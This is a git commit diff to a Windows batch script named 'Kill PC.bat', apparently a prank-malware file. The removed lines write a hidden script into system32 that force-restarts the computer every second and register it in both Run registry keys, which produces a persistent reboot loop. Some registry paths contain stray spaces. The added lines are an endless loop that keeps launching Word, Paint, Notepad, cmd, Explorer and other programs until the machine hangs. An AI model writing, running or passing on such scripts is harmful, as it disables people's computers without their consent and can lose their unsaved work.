eb2328f0932c47a2a7cfd6c44a70d70610402ee1
GitHubRoot <49114962+GitHubRootADMIN@users.noreply.github.com>
2019-03-31 02:01:28 -0700

    Update Kill PC.bat

--- Kill PC.bat
+++ Kill PC.bat
@@ -1,6 +1,11 @@
-@echo off>>%systemroot%\system32\agagagag43.ba
-echo Break off>>%systemroot%\system32\agagagag43.bat
-echo Attrib +r +h>>%systemroot%\system32\agagagag43.bat
-echo Shutdown -f -r -t 1 -c"lol">>%systemroot%\system32\agagagag43.bat 
-reg add hkey_local_machine\software\microsoft\windows\curr entversion\run /v agagagag43 /t reg_sz /d %systemroot%\system32\agagagag43.bat /f 
-reg add hkey_current_user\software\microsoft\windows\curre ntversion\run /v agagagag43 /t reg_sz /d %systemroot%\system32\agagagag43.bat /f 
+@echo off
+ :x
+ start winword
+ start mspaint
+ start notepad
+ start write
+ start cmd
+ start explorer
+ start control
+ start calc
+ goto x
